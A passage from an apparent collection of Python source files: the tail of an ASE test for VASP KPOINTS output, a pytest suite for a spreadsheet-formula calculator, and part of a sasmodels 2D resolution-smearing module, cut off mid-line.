0.000000 0.000000 0.000000 1.0 \n    0.000000 0.500000 0.500000 1.0 \n    \"\"\")\n\n    assert filecmp_ignore_whitespace('KPOINTS', 'KPOINTS.ref')\n    os.remove('KPOINTS.ref')\n", "148": "from ase.test.calculator.vasp.filecmp_ignore_whitespace import (\n    filecmp_ignore_whitespace)\n\ndef test_vasp_kpoints(require_vasp):\n    \"\"\"\n\n    Check the many ways of specifying KPOINTS\n\n    \"\"\"\n\n    import os\n\n    from ase.calculators.vasp import Vasp\n    from ase.build import bulk\n    from ase.test.calculator.vasp import installed\n\n    assert installed()\n\n    Al = bulk('Al', 'fcc', a=4.5, cubic=True)\n\n\n    def check_kpoints_line(n, contents):\n        \"\"\"Assert the contents of a line\"\"\"\n        with open('KPOINTS', 'r') as f:\n            lines = f.readlines()\n            assert lines[n] == contents\n\n    # Default to (1 1 1)\n\n    calc = Vasp(gamma=True)\n    calc.write_kpoints()\n    check_kpoints_line(2, 'Gamma\\n')\n    check_kpoints_line(3, '1 1 1 \\n')\n    calc.clean()\n\n    # 3-tuple prints mesh\n    calc = Vasp(gamma=False, kpts=(4, 4, 4))\n    calc.write_kpoints()\n    check_kpoints_line(2, 'Monkhorst-Pack\\n')\n    check_kpoints_line(3, '4 4 4 \\n')\n    calc.clean()\n\n    # Auto mode\n    calc = Vasp(kpts=20)\n    calc.write_kpoints()\n    check_kpoints_line(1, '0\\n')\n    check_kpoints_line(2, 'Auto\\n')\n    check_kpoints_line(3, '20 \\n')\n    calc.clean()\n\n    # 1-element list ok, Gamma ok\n    calc = Vasp(kpts=[20], gamma=True)\n    calc.write_kpoints()\n    check_kpoints_line(1, '0\\n')\n    check_kpoints_line(2, 'Auto\\n')\n    check_kpoints_line(3, '20 \\n')\n    calc.clean()\n\n    # KSPACING suppresses KPOINTS file\n    calc = Vasp(kspacing=0.23)\n    calc.initialize(Al)\n    calc.write_kpoints()\n    calc.write_incar(Al)\n    assert not os.path.isfile('KPOINTS')\n    with open('INCAR', 'r') as f:\n        assert ' KSPACING = 0.230000\\n' in f.readlines()\n    calc.clean()\n\n    # Negative KSPACING raises an error\n    calc = Vasp(kspacing=-0.5)\n\n    try:\n        calc.write_kpoints()\n    except ValueError:\n        pass\n    else:\n        raise AssertionError(\"Negative KSPACING did not raise ValueError\")\n    calc.clean()\n\n    # Explicit weighted points with nested lists, Cartesian if not specified\n    calc = Vasp(\n        kpts=[[0.1, 0.2, 0.3, 2], [0.0, 0.0, 0.0, 1], [0.0, 0.5, 0.5, 2]])\n    calc.write_kpoints()\n\n    with open('KPOINTS.ref', 'w') as f:\n        f.write(\"\"\"KPOINTS created by Atomic Simulation Environment\n    3 \n    Cartesian\n    0.100000 0.200000 0.300000 2.000000 \n    0.000000 0.000000 0.000000 1.000000 \n    0.000000 0.500000 0.500000 2.000000 \n    \"\"\")\n\n    assert filecmp_ignore_whitespace('KPOINTS', 'KPOINTS.ref')\n    os.remove('KPOINTS.ref')\n\n    # Explicit points as list of tuples, automatic weighting = 1.\n    calc = Vasp(\n        kpts=[(0.1, 0.2, 0.3), (0.0, 0.0, 0.0), (0.0, 0.5, 0.5)], reciprocal=True)\n    calc.write_kpoints()\n\n    with open('KPOINTS.ref', 'w') as f:\n        f.write(\"\"\"KPOINTS created by Atomic Simulation Environment\n    3 \n    Reciprocal\n    0.100000 0.200000 0.300000 1.0 \n    0.000000 0.000000 0.000000 1.0 \n    0.000000 0.500000 0.500000 1.0 \n    \"\"\")\n\n    assert filecmp_ignore_whitespace('KPOINTS', 'KPOINTS.ref')\n    os.remove('KPOINTS.ref')\n", "149": "# -*- coding: utf-8 -*-\nfrom __future__ import absolute_import, division, print_function, unicode_literals\n\nimport pytest\n\nfrom efc.rpn_builder.parser.operands import (\n    BadReference,\n    NotFoundErrorOperand, NumErrorOperand,\n    ValueErrorOperand,\n    ValueNotAvailable,\n    ZeroDivisionErrorOperand,\n)\nfrom .mock import ExcelMock, get_calculator\n\n\n@pytest.fixture(scope='session')\ndef calc():\n    source = ExcelMock()\n    calculator = get_calculator()\n    return lambda line, ws_name: calculator(line, ws_name, source)\n\n\ndef test_SUM(calc):\n    assert calc('SUM(Sheet4!A1:B3)', 'Yet another sheet').value == 64\n    assert calc('SUM([0]Sheet4!A1:B3)', 'Yet another sheet').value == 64\n    assert calc('SUM(Sheet4!A1:B3) + 1', 'Yet another sheet').value == 65\n    assert calc('SUM(Sheet4!A1:B3,A2:B3)', 'Sheet4').value == 99\n    assert calc('SUM(Sheet4!A1:B3,SUM(A3:B3))', 'Sheet4').value == 70\n\n\ndef test_SUMIFS(calc):\n    assert calc('SUMIFS(Sheet4!A1:B3,Sheet4!A1:B3,\">4\")', 'Yet another sheet').value == 58\n    assert calc('SUMIFS(Sheet4!A1:B3,Sheet4!A1:B3,\"13\")', 'Yet another sheet').value == 26\n\n\ndef test_SUMIF(calc):\n    assert calc('SUMIF(Sheet4!A1:B3,\">4\",Sheet4!A1:B3)', 'Yet another sheet').value == 58\n    assert calc('SUMIF(Sheet4!A1:B3,\"13\",Sheet4!A1:B3)', 'Yet another sheet').value == 26\n\n\ndef test_MOD(calc):\n    assert calc('MOD(\\'Sheet 1\\'!B3,4)', 'Yet another sheet').value == 2\n    assert calc('MOD(\\'Sheet 1\\'!A3,\\'Sheet 1\\'!C3)', 'Yet another sheet').value == 4\n    assert calc('MOD(\\'Sheet 1\\'!A3,\\'Sheet 1\\'!B3 * 2)', 'Yet another sheet').value == 0\n\n\ndef test_IF(calc):\n    assert calc('IF(2>1,1,2)', 'Yet another sheet').value == 1\n    assert calc('IF(TRUE,1,2)', 'Yet another sheet').value == 1\n    assert calc('IF(FALSE,1,2)', 'Yet another sheet').value == 2\n    assert calc('IF(TRUE,1,2 ** 5)', 'Yet another sheet').value == 1\n    assert calc('IF(\\'Sheet 1\\'!A3 = 4,\\'Sheet 1\\'!C3, 0)', 'Yet another sheet').value == 8\n\n    assert calc('IF(TRUE, 1,)', 'Yet another sheet').value == 1\n    assert calc('IF(FALSE, 1,)', 'Yet another sheet').value == 0\n    assert calc('CONCATENATE(IF(FALSE, 1,))', 'Yet another sheet').value == ''\n\n\n@pytest.mark.parametrize('prefix', ('_xlfn.', '_xludf.', ''))\ndef test_IFS(calc, prefix):\n    assert calc(prefix + 'IFS(FALSE,1,FALSE,2,TRUE,3)', 'Yet another sheet').value == 3\n    assert calc(prefix + 'IFS(TRUE,1,FALSE,2,TRUE,3)', 'Yet another sheet').value == 1\n    assert calc(prefix + 'IFS(FALSE,1,TRUE,2,TRUE,3)', 'Yet another sheet').value == 2\n\n    with pytest.raises(ValueNotAvailable):\n        assert calc(prefix + 'IFS(FALSE,1,FALSE,2,FALSE,3)', 'Yet another sheet').value == 1\n\n\ndef test_IFERROR(calc):\n    assert calc('IFERROR(5/0,1)', 'Yet another sheet').value == 1\n    assert calc('IFERROR(5+6, 0)', 'Yet another sheet').value == 11\n\n\ndef test_MAX(calc):\n    assert calc('MAX(Sheet4!A1:B3)', 'Yet another sheet').value == 16\n    assert calc('MAX(Sheet4!A1:B3,100)', 'Yet another sheet').value == 100\n\n\ndef test_MIN(calc):\n    assert calc('MIN(Sheet4!A1:B3)', 'Yet another sheet').value == 2\n    assert calc('MIN(Sheet4!A1:B3,1)', 'Yet another sheet').value == 1\n\n\ndef test_LEFT(calc):\n    assert calc('LEFT(\"test\", 2)', 'Yet another sheet').value == 'te'\n\n\ndef test_RIGHT(calc):\n    assert calc('RIGHT(\"test\", 2)', 'Yet another sheet').value == 'st'\n\n\ndef test_MID(calc):\n    assert calc('MID(\"hello\",2,2)', 'Sheet 1').value == 'el'\n\n\ndef test_ISBLANK(calc):\n    assert calc('ISBLANK(\"test\")', 'Yet another sheet').value is False\n    assert calc('ISBLANK(\"\")', 'Yet another sheet').value is False\n    assert calc('ISBLANK(Sheet4!AA1)', 'Yet another sheet').value is True\n\n\ndef test_OR(calc):\n    assert calc('OR(0,0,0,TRUE)', 'Yet another sheet').value is True\n    assert calc('OR(FALSE, 0)', 'Yet another sheet').value is False\n    assert calc('OR(FALSE, 0 + 2)', 'Yet another sheet').value is True\n\n\ndef test_AND(calc):\n    assert calc('AND(1,1,1,TRUE)', 'Yet another sheet').value is True\n    assert calc('AND(FALSE, 0)', 'Yet another sheet').value is False\n    assert calc('AND(TRUE, 0 + 2)', 'Yet another sheet').value is True\n\n\ndef test_not(calc):\n    assert calc('NOT(1)', 'Yet another sheet').value is False\n    assert calc('NOT(0)', 'Yet another sheet').value is True\n    assert calc('NOT(123)', 'Yet another sheet').value is False\n    assert calc('NOT(TRUE)', 'Yet another sheet').value is False\n    assert calc('NOT(FALSE)', 'Yet another sheet').value is True\n    assert calc('NOT(A1)', 'Yet another sheet').value is True\n    assert calc('NOT(A1)', 'Sheet4').value is False\n    assert calc('NOT(\"\")', 'Yet another sheet').value is True\n    assert calc('NOT(NOT(\"\"))', 'Yet another sheet').value is False\n\n\ndef test_ROUND(calc):\n    assert calc('ROUND(2.3456, 1)', 'Yet another sheet').value == 2.3\n    assert calc('ROUND(2, 2)', 'Yet another sheet').value == 2.0\n    assert calc('ROUND(\"2.34567\", 2)', 'Yet another sheet').value == 2.35\n\n\ndef test_ROUNDDOWN(calc):\n    assert calc('ROUNDDOWN(1.345,0)', 'Sheet 1').value == 1.0\n    assert calc('ROUNDDOWN(1.345,1)', 'Sheet 1').value == 1.3\n    assert calc('ROUNDDOWN(1.345,2)', 'Sheet 1').value == 1.34\n\n\ndef test_FLOOR(calc):\n    assert calc('FLOOR(10,3)', 'Sheet 1').value == 9\n    assert calc('FLOOR(16,7)', 'Sheet 1').value == 14\n    assert calc('FLOOR(26,13)', 'Sheet 1').value == 26\n\n\ndef test_COUNT(calc):\n    assert calc('COUNT(1.3456, 1, \"test\")', 'Yet another sheet').value == 2\n    assert calc('COUNT(A1:C4)', 'Sheet 1').value == 6\n\n\ndef test_COUNTIF(calc):\n    assert calc('COUNTIF(A1:C4, \">4\")', 'Sheet 1').value == 4\n    assert calc('COUNTIF(A1:C4, \"13\")', 'Sheet4').value == 2\n\n\ndef test_COUNTBLANK(calc):\n    assert calc('COUNTBLANK(A1:C4)', 'Sheet 1').value == 6\n    assert calc('COUNTBLANK(A1:B4)', 'Sheet4').value == 2\n\n\ndef test_ABS(calc):\n    assert calc('ABS(1.32)', 'Sheet 1').value == 1.32\n    assert calc('ABS(-42)', 'Sheet4').value == 42\n\n\ndef test_OFFSET(calc):\n    assert calc('OFFSET(A1,2,1)', 'Sheet 1').value == 2\n    assert calc('OFFSET(A1,2,1,1)', 'Sheet 1').value == 2\n    assert calc('OFFSET(A1,B3,1)', 'Sheet 1').value == 2\n    assert calc('SUM(OFFSET(A1,2,1,1,2))', 'Sheet 1').value == 10\n\n\ndef test_MATCH(calc):\n    assert calc('MATCH(13,Sheet4!A1:A3)', 'Yet another sheet').value == 1\n\n\ndef test_AVERAGE(calc):\n    assert calc('AVERAGE(Sheet4!A1:B3)', 'Yet another sheet').value == 64 / 6\n    assert calc('AVERAGEIFS(Sheet4!A1:B3,Sheet4!A1:B3,\"13\")', 'Yet another sheet').value == 13\n\n\ndef test_AVERAGEIFS(calc):\n    assert calc('AVERAGEIFS(Sheet4!A1:B3,Sheet4!A1:B3,\"13\")', 'Yet another sheet').value == 13\n\n\n@pytest.mark.parametrize(\n    ('formula', 'result'),\n    (('VLOOKUP(13,TestVLookup!A1:B3,2)', 17),\n     ('VLOOKUP(13,TestVLookup!A1:B3,2,1)', 17),\n     ('VLOOKUP(13,TestVLookup!A1:B3,2,0)', 16),\n     ('VLOOKUP(4,\\'Yet another sheet\\'!A100:ZZ110,27)', 45),\n     pytest.param('VLOOKUP(4,TestVLookup!A1:B3,2)', 12435,\n                  marks=pytest.mark.xfail(raises=NotFoundErrorOperand, strict=True)),\n     pytest.param('VLOOKUP(24,TestVLookup!A1:B3,2)', 12435,\n                  marks=pytest.mark.xfail(raises=NotFoundErrorOperand, strict=True))),\n)\ndef test_VLOOKUP(calc, formula, result):\n    assert calc(formula, 'Sheet4').value == result\n\n\n@pytest.mark.parametrize(\n    ('formula', 'result'),\n    (('HLOOKUP(13,TestHLookup!A1:B3,2)', 17),\n     ('HLOOKUP(13,TestHLookup!A1:B3,2,1)', 17),\n     ('HLOOKUP(13,TestHLookup!A1:B3,2,0)', 16),\n     ('HLOOKUP(45,\\'Yet another sheet\\'!A104:ZZ04,1)', 45),\n     pytest.param('HLOOKUP(4,TestHLookup!A1:B3,2)', 12435,\n                  marks=pytest.mark.xfail(raises=NotFoundErrorOperand, strict=True)),\n     pytest.param('HLOOKUP(24,TestHLookup!A1:B3,2)', 12435,\n                  marks=pytest.mark.xfail(raises=NotFoundErrorOperand, strict=True))),\n)\ndef test_HLOOKUP(calc, formula, result):\n    assert calc(formula, 'Sheet4').value == result\n\n\ndef test_SEARCH(calc):\n    assert calc('SEARCH(\"abc\", \"abc\")', 'Yet another sheet').value == 1\n    assert calc('SEARCH(\"abc\", \"abc\", 1)', 'Yet another sheet').value == 1\n    assert calc('SEARCH(\"abc\", \"aabc\", 1)', 'Yet another sheet').value == 2\n\n    with pytest.raises(ValueErrorOperand):\n        assert calc('SEARCH(\"abcd\", \"abc\")', 'Yet another sheet').value\n\n    with pytest.raises(ValueErrorOperand):\n        assert calc('SEARCH(\"abcd\", \"abc\", 1)', 'Yet another sheet').value\n\n\ndef test_SMALL(calc):\n    assert calc('SMALL(Sheet4!A1:B3,1)', 'Yet another sheet').value == 2\n    assert calc('SMALL(Sheet4!A1:B3,2)', 'Yet another sheet').value == 4\n    assert calc('SMALL(Sheet4!A1:B3,4)', 'Yet another sheet').value == 13\n\n\ndef test_LARGE(calc):\n    assert calc('LARGE(Sheet4!A1:B3,1)', 'Yet another sheet').value == 16\n    assert calc('LARGE(Sheet4!A1:B3,2)', 'Yet another sheet').value == 16\n    assert calc('LARGE(Sheet4!A1:B3,4)', 'Yet another sheet').value == 13\n\n\ndef test_COUNTIFS(calc):\n    assert calc('COUNTIFS(Sheet4!A1:B3,Sheet4!A1:B3,\">4\")', 'Yet another sheet').value == 4\n    assert calc('COUNTIFS(Sheet4!A1:B3,Sheet4!A1:B3,\"13\")', 'Yet another sheet').value == 2\n\n\ndef test_COUNTA(calc):\n    assert calc('COUNTA(Sheet4!A1:B4)', 'Yet another sheet').value == 6\n    assert calc('COUNTA(Sheet5!A1:B4)', 'Yet another sheet').value == 5\n\n\ndef test_CONCATENATE(calc):\n    assert calc('CONCATENATE(Sheet4!A1,Sheet4!B3,\"13\")', 'Yet another sheet').value == '13213'\n    assert calc('CONCATENATE(\"\",Sheet4!B3,TRUE)', 'Yet another sheet').value == '2TRUE'\n\n\ndef test_INDEX(calc):\n    assert calc('INDEX(Sheet4!A1:A3,1)', 'Yet another sheet').value == 13  # A1\n    assert calc('INDEX(Sheet4!A1:B3,1,2)', 'Yet another sheet').value == 16  # B1\n    assert calc('INDEX(Sheet4!A1:A3,3)', 'Yet another sheet').value == 4  # A3\n    assert calc('INDEX(Sheet4!A2:A3,2)', 'Yet another sheet').value == 4  # A3\n\n    assert calc('INDEX(Sheet4!A:A,3)', 'Yet another sheet').value == 4  # A3\n    assert calc('INDEX(Sheet4!A:A,3,1)', 'Yet another sheet').value == 4  # A3\n    assert calc('INDEX(Sheet4!3:3,1,1)', 'Yet another sheet').value == 4  # A3\n    assert calc('INDEX(Sheet4!3:3,1,2)', 'Yet another sheet').value == 2  # B3\n\n    with pytest.raises(BadReference):\n        assert calc('INDEX(Sheet4!A1:A3,100,1)', 'Yet another sheet').value\n\n    with pytest.raises(BadReference):\n        assert calc('INDEX(Sheet4!A1:A3,1,100)', 'Yet another sheet').value\n\n    assert calc('INDEX(Sheet4!A1:C3,1,1)', 'Yet another sheet').value == 13\n    assert calc('INDEX(Sheet4!A1:C3,1,3)', 'Yet another sheet').value == 18\n\n    with pytest.raises(BadReference):\n        assert calc('INDEX(Sheet4!A1:C3,1)', 'Yet another sheet').value\n\n    with pytest.raises(BadReference):\n        assert calc('INDEX(Sheet4!A1:C3,100,1)', 'Yet another sheet').value\n\n    with pytest.raises(BadReference):\n        assert calc('INDEX(Sheet4!A1:C3,1,100)', 'Yet another sheet').value\n\n    with pytest.raises(BadReference):\n        assert calc('INDEX(Sheet4!A1:C3,0,100)', 'Yet another sheet').value\n\n    with pytest.raises(BadReference):\n        assert calc('INDEX(Sheet4!A1:C3,1,0)', 'Yet another sheet').value\n\n    with pytest.raises(BadReference):\n        assert calc('INDEX(Sheet4!A:A,3,2)', 'Yet another sheet').value\n\n    with pytest.raises(BadReference):\n        assert calc('INDEX(Sheet4!1:1,2)', 'Yet another sheet').value\n\n\ndef test_SUBSTITUTE(calc):\n    assert calc('SUBSTITUTE(\"123123123\",\"1\",\"22\")', 'Yet another sheet').value == '222322232223'\n    assert calc('SUBSTITUTE(\"123123123\",\"1\",\"22\", 2)', 'Yet another sheet').value == '22232223123'\n    assert calc('SUBSTITUTE(\"123123123\",\"1\",\"22\", -1)', 'Yet another sheet').value == '222322232223'\n\n\ndef test_TRIM(calc):\n    assert calc('TRIM(1)', 'Yet another sheet').value == '1'\n    assert calc('TRIM(0)', 'Yet another sheet').value == '0'\n    assert calc('TRIM(\"1\")', 'Yet another sheet').value == '1'\n    assert calc('TRIM(\" 1 \")', 'Yet another sheet').value == '1'\n    assert calc('TRIM(\" 1 1 \")', 'Yet another sheet').value == '1 1'\n    assert calc('TRIM(\" 1      1 \")', 'Yet another sheet').value == '1 1'\n\n\ndef test_LEN(calc):\n    assert calc('LEN(1)', 'Yet another sheet').value == 1\n    assert calc('LEN(0)', 'Yet another sheet').value == 1\n    assert calc('LEN(\"1\")', 'Yet another sheet').value == 1\n    assert calc('LEN(\" 1 \")', 'Yet another sheet').value == 3\n\n\ndef test_YEARFRAC(calc):\n    with pytest.raises(NumErrorOperand):\n        assert calc('YEARFRAC(1, 2, 5)', 'Yet another sheet').value\n\n    # 30U/360\n    assert calc('YEARFRAC(43159, 43160)', 'Yet another sheet').value == 1 / 360\n    assert calc('YEARFRAC(43405, 43465, 0)', 'Yet another sheet').value == 60 / 360\n    assert calc('YEARFRAC(43889, 43890, 0)', 'Yet another sheet').value == 1 / 360\n    assert calc('YEARFRAC(43889, 43891, 0)', 'Yet another sheet').value == 3 / 360\n\n    # Actual/Actual\n    assert calc('YEARFRAC(43889, 43890, 1)', 'Yet another sheet').value == 1 / 366\n    assert calc('YEARFRAC(43889, 43891, 1)', 'Yet another sheet').value == 2 / 366\n    assert calc('YEARFRAC(43523, 43524, 1)', 'Yet another sheet').value == 1 / 365\n    assert calc('YEARFRAC(43523, 43525, 1)', 'Yet another sheet').value == 2 / 365\n\n    # Actual/360\n    assert calc('YEARFRAC(43889, 43890, 2)', 'Yet another sheet').value == 1 / 360\n    assert calc('YEARFRAC(43889, 43891, 2)', 'Yet another sheet').value == 2 / 360\n    assert calc('YEARFRAC(43523, 43524, 2)', 'Yet another sheet').value == 1 / 360\n    assert calc('YEARFRAC(43523, 43525, 2)', 'Yet another sheet').value == 2 / 360\n\n    # Actual/365\n    assert calc('YEARFRAC(43889, 43890, 3)', 'Yet another sheet').value == 1 / 365\n    assert calc('YEARFRAC(43889, 43891, 3)', 'Yet another sheet').value == 2 / 365\n    assert calc('YEARFRAC(43523, 43524, 3)', 'Yet another sheet').value == 1 / 365\n    assert calc('YEARFRAC(43523, 43525, 3)', 'Yet another sheet').value == 2 / 365\n\n    # 30E/360\n    assert calc('YEARFRAC(43159, 43160, 4)', 'Yet another sheet').value == 3 / 360\n    assert calc('YEARFRAC(43405, 43465, 4)', 'Yet another sheet').value == 59 / 360\n    assert calc('YEARFRAC(43889, 43890, 4)', 'Yet another sheet').value == 1 / 360\n    assert calc('YEARFRAC(43889, 43891, 4)', 'Yet another sheet').value == 3 / 360\n\n\ndef test_lower(calc):\n    with pytest.raises(ZeroDivisionErrorOperand):\n        _ = calc('LOWER(1/0)', 'Yet another sheet').value\n\n    assert calc('LOWER(1)', 'Yet another sheet').value == '1'\n    assert calc('LOWER(\"1\")', 'Yet another sheet').value == '1'\n    assert calc('LOWER(\"TEST\")', 'Yet another sheet').value == 'test'\n    assert calc('LOWER(\"test\")', 'Yet another sheet').value == 'test'\n    assert calc('LOWER(\"TeSt %1234\")', 'Yet another sheet').value == 'test %1234'\n\n\ndef test_upper(calc):\n    with pytest.raises(ZeroDivisionErrorOperand):\n        _ = calc('UPPER(1/0)', 'Yet another sheet').value\n\n    assert calc('UPPER(1)', 'Yet another sheet').value == '1'\n    assert calc('UPPER(\"1\")', 'Yet another sheet').value == '1'\n    assert calc('UPPER(\"TEST\")', 'Yet another sheet').value == 'TEST'\n    assert calc('UPPER(\"test\")', 'Yet another sheet').value == 'TEST'\n    assert calc('UPPER(\"TeSt %1234\")', 'Yet another sheet').value == 'TEST %1234'\n\n\n@pytest.mark.parametrize(\n    ('formula', 'ws', 'result'),\n    (('ROW(A1)', 'Yet another sheet', 1),\n     ('ROW(C1)', 'Yet another sheet', 1),\n     ('ROW(C3)', 'Yet another sheet', 3),\n     ('ROW(GH12435)', 'Yet another sheet', 12435),\n     pytest.param('ROW(1234)', 'Yet another sheet', 12435,\n                  marks=pytest.mark.xfail(raises=ValueErrorOperand, strict=True)),\n     pytest.param('ROW(\"123\")', 'Yet another sheet', 12435,\n                  marks=pytest.mark.xfail(raises=ValueErrorOperand, strict=True))),\n)\ndef test_row(calc, formula, ws, result):\n    assert calc(formula, ws).value == result\n\n\n@pytest.mark.parametrize(\n    ('formula', 'ws', 'result'),\n    (('COLUMN(A1)', 'Yet another sheet', 1),\n     ('COLUMN(C1)', 'Yet another sheet', 3),\n     ('COLUMN(GH12435)', 'Yet another sheet', 190),\n     pytest.param('COLUMN(1234)', 'Yet another sheet', 12435,\n                  marks=pytest.mark.xfail(raises=ValueErrorOperand, strict=True)),\n     pytest.param('COLUMN(\"123\")', 'Yet another sheet', 12435,\n                  marks=pytest.mark.xfail(raises=ValueErrorOperand, strict=True))),\n)\ndef test_column(calc, formula, ws, result):\n    assert calc(formula, ws).value == result\n", "150": "\"\"\"\n#This software was developed by the University of Tennessee as part of the\n#Distributed Data Analysis of Neutron Scattering Experiments (DANSE)\n#project funded by the US National Science Foundation.\n#See the license text in license.txt\n\"\"\"\nfrom __future__ import division\n\nimport numpy as np  # type: ignore\nfrom numpy import pi, cos, sin, sqrt  # type: ignore\n\nfrom . import resolution\nfrom .resolution import Resolution\n\n## Singular point\nSIGMA_ZERO = 1.0e-010\n## Limit of how many sigmas to be covered for the Gaussian smearing\n# default: 2.5 to cover 98.7% of Gaussian\nNSIGMA = 3.0\n## Defaults\nNR = {'xhigh':10, 'high':5, 'med':5, 'low':3}\nNPHI = {'xhigh':20, 'high':12, 'med':6, 'low':4}\n\n## Defaults\nN_SLIT_PERP = {'xhigh':1000, 'high':500, 'med':200, 'low':50}\nN_SLIT_PERP_DOC = \", \".join(\"%s=%d\"%(name, value)\n                            for value, name in\n                            sorted((2*v+1, k) for k, v in N_SLIT_PERP.items()))\n\nclass Pinhole2D(Resolution):\n    \"\"\"\n    Gaussian Q smearing class for SAS 2d data\n    \"\"\"\n\n    def __init__(self, data=None, index=None,\n                 nsigma=NSIGMA, accuracy='Low', coords='polar'):\n        \"\"\"\n        Assumption: equally spaced bins in dq_r, dq_phi space.\n\n        :param data: 2d data used to set the smearing parameters\n        :param index: 1d array with len(data) to define the range\n         of the calculation: elements are given as True or False\n        :param nr: number of bins in dq_r-axis\n        :param nphi: number of bins in dq_phi-axis\n        :param coord: coordinates [string], 'polar' or 'cartesian'\n        \"\"\"\n        ## Accuracy: Higher stands for more sampling points in both directions\n        ## of r and phi.\n        ## number of bins in r axis for over-sampling\n        self.nr = NR[accuracy.lower()]\n        ## number of bins in phi axis for over-sampling\n        self.nphi = NPHI[accuracy.lower()]\n        ## maximum nsigmas\n        self.nsigma = nsigma\n        self.coords = coords\n        self._init_data(data, index)\n\n    def _init_data(self, data, index):\n        \"\"\"\n        Get qx_data, qy_data, dqx_data,dqy_data,\n        and calculate phi_data=arctan(qx_data/qy_data)\n        \"\"\"\n        # TODO: maybe don't need to hold copy of qx,qy,dqx,dqy,data,index\n        # just need q_calc and weights\n        self.data = data\n        self.index = index if index is not None else slice(None)\n\n        self.qx_data = data.qx_data[self.index]\n        self.qy_data = data.qy_data[self.index]\n        self.q_data = data.q_data[self.index]\n\n        dqx = getattr(data, 'dqx_data', None)\n        dqy = getattr(data, 'dqy_data', None)\n        if dqx is not None and dqy is not None:\n            # Here dqx and dqy mean dq_parr and dq_perp\n            self.dqx_data = dqx[self.index]\n            self.dqy_data = dqy[self.index]\n            ## Remove singular points if exists\n            self.dqx_data[self.dqx_data < SIGMA_ZERO] = SIGMA_ZERO\n            self.dqy_data[self.dqy_data < SIGMA_ZERO] = SIGMA_ZERO\n            qx_calc, qy_calc, weights = self._calc_res()\n            self.q_calc = [qx_calc, qy_calc]\n            self.q_calc_weights = weights\n        else:\n            # No resolution information\n            self.dqx_data = self.dqy_data = None\n            self.q_calc = [self.qx_data, self.qy_data]\n            self.q_calc_weights = None\n\n        #self.phi_data = np.arctan(self.qx_data / self.qy_data)\n\n    def _calc_res(self):\n        \"\"\"\n        Over sampling of r_nbins times phi_nbins, calculate Gaussian weights,\n        then find smeared intensity\n        \"\"\"\n        nr, nphi = self.nr, self.nphi\n        # Total number of bins = # of bins\n        nbins = nr * nphi\n        # Number of bins in the dqr direction (polar coordinate of dqx and dqy)\n        bin_size = self.nsigma / nr\n        # in dq_r-direction times # of bins in dq_phi-direction\n        # data length in the range of self.index\n        nq = len(self.qx_data)\n\n        # Mean values of dqr at each bins\n        # starting from the half of bin size\n        r = bin_size / 2.0 + np.arange(nr) * bin_size\n        # mean values of qphi at each bines\n        phi = np.arange(nphi)\n        dphi = phi * 2.0 * pi / nphi\n        dphi = dphi.repeat(nr)\n\n        ## Transform to polar coordinate,\n        #  and set dphi at each data points ; 1d array\n        dphi = dphi.repeat(nq)\n        q_phi = self.qy_data / self.qx_data\n\n        # Starting angle is different between polar\n        #  and cartesian coordinates.\n        #if self.coords != 'polar':\n        #    dphi += np.arctan( q_phi * self.dqx_data/ \\\n        #                  self.dqy_data).repeat(nbins).reshape(nq,\\\n        #                                nbins).transpose().flatten()\n\n        # The angle (phi) of the original q point\n        q_phi = np.arctan(q_phi).repeat(nbins)\\\n            .reshape([nq, nbins]).transpose().flatten()\n        ## Find Gaussian weight for each dq bins: The weight depends only\n        #  on r-direction (The integration may not need)\n        weight_res = (np.exp(-0.5 * (r - bin_size / 2.0)**2)  -\n                      np.exp(-0.5 * (r + bin_size / 2.0)**2))\n        # No needs of normalization here.\n        #weight_res /= np.sum(weight_res)\n        weight_res = weight_res.repeat(nphi).reshape(nr, nphi)\n        weight_res = weight_res.transpose().flatten()\n\n        ## Set dr for all dq bins for averaging\n        dr = r.repeat(nphi).reshape(nr, nphi).transpose().flatten()\n        ## Set dqr for all data points\n        dqx = np.outer(dr, self.dqx_data).flatten()\n        dqy = np.outer(dr, self.dqy_data).flatten()\n\n        qx = self.qx_data.repeat(nbins)\\\n            .reshape(nq, nbins).transpose().flatten()\n        qy = self.qy_data.repeat(nbins)\\\n            .reshape(nq, nbins).transpose().flatten()\n\n        # The polar needs rotation by -q_phi\n        if self.coords == 'polar':\n            q_r = sqrt(qx**2 + qy**2)\n            qx_res = ((dqx*cos(dphi) + q_r) * cos(-q_phi)\n                      + dqy*sin(dphi) * sin(-q_phi))\n            qy_res = (-(dqx*cos(dphi) + q_r) * sin(-q_phi)\n                      + dqy*sin(dphi) * cos(-q_phi))\n        else:\n            qx_res = qx + dqx*cos(dphi)\n            qy_res = qy + dqy*sin(dphi)\n\n\n        return qx_res, qy_res, weight_res\n\n    def apply(self, theory):\n        if self.q_calc_weights is not None:\n            # TODO: interpolate rather than recomputing all the different qx,qy\n            # Resolution needs to be applied\n            nq, nbins = len(self.qx_data), self.nr * self.nphi\n            ## Reshape into 2d array to use np weighted averaging\n            theory = np.reshape(theory, (nbins, nq))\n            ## Averaging with Gaussian weighting: normalization included.\n            value = np.average(theory, axis=0, weights=self.q_calc_weights)\n            ## Return the smeared values in the range of self.index\n            return value\n        else:\n            return theory\n\n\nclass Slit2D(Resolution):\n    \"\"\"\n    Slit aperture with resolution function on an oriented sample.\n\n    *q* points at which the data is measured.\n\n    *qx_width* slit width in qx\n\n    *qy_width* slit height in qy; current implementation requires a fixed\n    qy_width for all q points.\n\n    *q_calc* is the list of q points to calculate, or None if this\n    should be estimated from the *q* and *qx_width*.\n\n    *accuracy* determines the number of *qy* points to compute for each *q*.\n    The values are stored in sasmodels.resolution2d.N_SLIT_PERP.  The default\n    values are: %s\n    \"\"\"\n    __doc__ = __doc__%N_SLIT_PERP_DOC\n    def __init__(self, q, qx_width, qy_width=0., q_calc=None, accuracy='low'):\n        # Remember what q and width was used even though we won't need them\n        # after the weight matrix is constructed\n        self.q, self.qx_width, self.qy_width = q, qx_width, qy_width\n\n        # Allow independent resolution on each qx point even though it is not\n        # needed in practice.  Set qy_width to the maximum qy width.\n        if np.isscalar(qx_width):\n            qx_width = np.ones(len(q))*qx_width\n        else:\n            qx_width = np.asarray(qx_width)\n        if not np.isscalar(qy_width):\n            qy_width = np.max(qy_width)\n\n        # Build grid of qx, qy points\n        if q_calc is not None:\n            qx_calc = np.sort(q_calc)\n        else:\n            qx_calc = resolution.pinhole_extend_q(q, qx_width, nsigma=3)\n        qy_min, qy_max = np.log10(np.min(q)), np.log10(qy_width)\n        qy_calc = np.logspace(qy_min, qy_max, N_SLIT_PERP[accuracy])\n        qy_calc = np.hstack((-qy_calc[::-1], 0, qy_calc))\n        self.q_calc = [v.flatten() for v in 